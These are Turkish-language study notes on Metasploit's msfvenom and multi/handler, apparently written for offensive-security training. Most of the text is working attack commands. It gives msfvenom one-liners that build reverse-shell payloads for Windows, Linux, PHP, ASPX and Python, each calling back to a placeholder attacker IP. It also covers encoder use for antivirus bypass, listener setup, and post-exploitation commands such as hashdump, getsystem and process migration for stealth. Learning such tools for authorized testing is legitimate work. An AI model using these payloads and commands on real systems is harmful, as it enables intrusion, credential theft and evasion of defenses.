# Shell Notları — Msfvenom & Metasploit Multi/Handler

---

## Msfvenom

Metasploit Framework'ün payload oluşturma aracıdır. Eski `msfpayload` ve `msfencode` araçlarının birleşimidir. Temel işlevi: hedef sistemde çalıştırılacak zararlı kod (payload) üretmek.

### Temel Syntax

```bash
msfvenom -p [PAYLOAD] [SEÇENEKLER] -f [FORMAT] -o [DOSYA]
```

| Parametre | Açıklama |
|---|---|
| `-p` | Payload seç |
| `LHOST` | Saldırganın IP'si (reverse shell için) |
| `LPORT` | Dinlenecek port |
| `-f` | Çıktı formatı (exe, elf, php, python...) |
| `-o` | Çıktı dosyası |
| `-e` | Encoder (AV bypass için) |
| `-i` | Encoding tekrar sayısı |
| `-b` | Bad character listesi |
| `--list` | Mevcut seçenekleri listele |

### Payload Türleri

**Staged vs Stageless**

| | Stageless | Staged |
|---|---|---|
| Gösterim | `shell_reverse_tcp` | `shell/reverse_tcp` |
| Çalışma | Tüm kod tek dosyada | Küçük stager indirir, asıl payload sonra gelir |
| Boyut | Büyük | Küçük |
| Gereksinim | Listener yeterli | Metasploit multi/handler gerekir |
| Kullanım | Basit durum | Boyut kısıtlı ortam, gelişmiş post-exploitation |

Slash sayısına dikkat: `shell_reverse_tcp` = stageless, `shell/reverse_tcp` = staged.

**Payload Adı Formatı**

```
[platform]/[mimari]/[payload_türü]

Örnekler:
windows/x64/shell_reverse_tcp      → stageless
windows/x64/shell/reverse_tcp      → staged
linux/x86/meterpreter_reverse_tcp  → stageless meterpreter
```

### Yaygın Kullanım Örnekleri

**Windows EXE — Stageless Reverse Shell**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=SALDIRGAN_IP LPORT=4444 -f exe -o shell.exe
```

**Linux ELF — Stageless Reverse Shell**
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=SALDIRGAN_IP LPORT=4444 -f elf -o shell.elf
chmod +x shell.elf
```

**PHP Reverse Shell**
```bash
msfvenom -p php/reverse_php LHOST=SALDIRGAN_IP LPORT=4444 -f raw -o shell.php
```

**ASP/ASPX (Windows web server)**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=SALDIRGAN_IP LPORT=4444 -f aspx -o shell.aspx
```

**Python**
```bash
msfvenom -p cmd/unix/reverse_python LHOST=SALDIRGAN_IP LPORT=4444 -f raw -o shell.py
```

### Payload Listesi

```bash
msfvenom --list payloads
msfvenom --list payloads | grep "linux"
msfvenom --list payloads | grep "windows.*reverse"
msfvenom --list formats
```

### Listener Açma

**Stageless için Netcat yeterli:**
```bash
nc -lvnp 4444
```

**Staged için Metasploit multi/handler gerekir:**
```bash
msfconsole
use exploit/multi/handler
set payload windows/x64/shell/reverse_tcp
set LHOST SALDIRGAN_IP
set LPORT 4444
run
```

### Meterpreter vs Shell Payload

| | Shell | Meterpreter |
|---|---|---|
| Yapı | Standart sistem shell'i | Gelişmiş in-memory agent |
| Disk'e yazılma | Var | Yok (memory-only) |
| Komutlar | OS komutları | Özel meterpreter komutları + OS |
| Post-exploitation | Kısıtlı | Güçlü (hashdump, migrate, getsystem...) |
| Stabilite | Düşük | Yüksek |
| AV tespiti | Kolay | Daha zor (ama yine tespit edilebilir) |

---

## Metasploit Multi/Handler

Multi/handler, Metasploit'in gelen bağlantıları dinlemek için kullandığı modüldür. Netcat listener'ının Metasploit versiyonu olarak düşünebilirsin — ancak çok daha güçlü.

Stageless shell için Netcat yeterlidir, ama şu durumlarda multi/handler zorunludur:
- Staged payload kullanıyorsan
- Meterpreter payload kullanıyorsan
- Post-exploitation modülleri kullanacaksan

### Temel Kullanım

```bash
msfconsole
use exploit/multi/handler

set payload windows/x64/shell_reverse_tcp   # msfvenom'da kullandıgınla aynı olmalı
set LHOST SALDIRGAN_IP
set LPORT 4444

run
```

**Kritik kural:** `set payload` ile seçilen payload, msfvenom'da kullanılanla birebir aynı olmalı. Uyuşmazsa bağlantı kurulamaz veya shell bozuk gelir.

### Background'da Çalıştırma

```bash
run -j          # listener'ı background'a al
jobs            # aktif job'ları gör
sessions        # session'ları listele
sessions -i [ID]  # bir session'a bağlan
```

### Meterpreter Session Komutları

```bash
# Temel bilgi
sysinfo
getuid
getpid

# Dosya sistemi
ls
cd /tmp
upload /local/file /remote/path
download /remote/file /local/path

# Privilege escalation
getsystem        # SYSTEM yetkisi almaya çalış
hashdump         # SAM veritabanından hash'leri al

# Process
ps
migrate [PID]    # başka processe taşın (stabilite + gizlilik)

# Ağ
ipconfig
arp
route

# Arka plan
background
```

### Shell ↔ Meterpreter Geçişi

```bash
# Meterpreter'dan normal shell'e
shell

# Normal shell'den Meterpreter'a yükselt
sessions -u [ID]
```

### Netcat vs Multi/Handler

| | Netcat | Multi/Handler |
|---|---|---|
| Staged payload | Çalışmaz | Çalışır |
| Meterpreter | Çalışmaz | Çalışır |
| Post-exploitation | Yok | Tam destek |
| Aynı anda çoklu session | Yok | Var |
| Kurulum gerekliliği | Yok | Metasploit gerekir |
